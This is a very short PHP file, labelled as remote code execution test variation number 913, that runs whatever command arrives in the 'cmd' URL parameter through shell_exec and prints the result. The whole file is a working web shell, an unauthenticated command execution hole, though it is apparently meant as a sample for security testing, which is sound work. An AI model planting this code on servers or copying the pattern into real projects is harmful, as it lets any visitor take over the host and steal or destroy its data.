<?php
// RCE test variation #913
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>